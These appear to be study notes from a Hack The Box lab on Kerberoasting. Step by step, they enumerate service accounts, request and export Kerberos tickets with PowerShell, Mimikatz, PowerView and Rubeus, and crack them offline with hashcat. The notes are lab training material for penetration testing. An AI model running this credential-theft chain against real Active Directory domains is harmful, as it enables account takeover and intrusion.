## Kerberoasting - Semi Manual method

Let's begin with the built-in [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\(v=ws.11\)) binary to enumerate SPNs in the domain.

#### Enumerating SPNs with setspn.exe

	C:\htb> setspn.exe -Q */*

We will focus on `user accounts` and ignore the computer accounts returned by the tool.

Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using `Mimikatz`. Let's try this by targeting a single user:

#### Targeting a Single User

	PS C:\htb> Add-Type -AssemblyName System.IdentityModel 
	PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

#### Retrieving All Tickets Using setspn.exe

	PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

this will also pull all computer accounts.

## Extracting Tickets from Memory with Mimikatz

	mimikatz # base64 /out:true
	isBase64InterceptInput is false 
	isBase64InterceptOutput is true 
	
	mimikatz # kerberos::list /export

Mimikatz will extract the tickets and write them to `.kirbi` files.

#### Preparing the Base64 Blob for Cracking

	AstraX01@htb[/htb]$ echo "<base64 blob>" | tr -d \\n 

	( base64 blob)


We can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.

#### Placing the Output into a File as .kirbi

	AstraX01@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi

Next, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the `kirbi2john.py` tool to extract the Kerberos ticket from the TGS file.

#### Extracting the Kerberos Ticket using kirbi2john.py

	AstraX01@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi

#### Modifiying crack_file for Hashcat

	AstraX01@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

#### Viewing the Prepared Hash

	AstraX01@htb[/htb]$ cat sqldev_tgs_hashcat

#### Cracking the Hash with Hashcat

	AstraX01@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt


---

## Automated / Tool Based Route

#### Powerview for extract the ticket 

We can start by enumerating SPN accounts.

#### Using PowerView to Enumerate SPN Accounts

	PS C:\htb> Import-Module .\PowerView.ps1 
	PS C:\htb> Get-DomainUser * -spn | select samaccountname

#### Using PowerView to Target a Specific User

	PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

#### Exporting All Tickets to a CSV File

	PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation


---
#### Using Rubeus

	PS C:\htb> .\Rubeus.exe

#### Using the /stats Flag

	PS C:\htb> .\Rubeus.exe kerberoast /stats

Let's use Rubeus to request tickets for accounts with the `admincount` attribute set to `1`.

Be sure to specify the `/nowrap` flag so that the hash can be more easily copied down for offline cracking using Hashcat.

#### Using the /nowrap Flag

	PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

Kerberoasting tools typically request `RC4 encryption` when performing the attack and initiating TGS-REQ requests. This is because RC4 is [weaker](https://www.stigviewer.com/stigs/microsoft_windows_10/2025-02-25/finding/V-220936) and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256.

**Let's start by creating an SPN account named `testspn` and using Rubeus to Kerberoast this**

	PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap

	PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

we can see that the `msDS-SupportedEncryptionTypes` attribute is set to `0`. The chart [here](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) tells us that a decimal value of `0` means that a specific encryption type is not defined and set to the default of `RC4_HMAC_MD5`.

#### Cracking the Ticket with Hashcat & rockyou.txt

	AstraX01@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt

#### Checking Supported Encryption Types

	PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

Requesting a new ticket with Rubeus will show us that the account name is using AES-256 (type 18) encryption.

#### Requesting a New Ticket

	PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap

To run this through Hashcat, we need to use hash mode `19700`.

#### Running Hashcat & Checking the Status of the Cracking Job

	AstraX01@htb[/htb]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt

We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket.

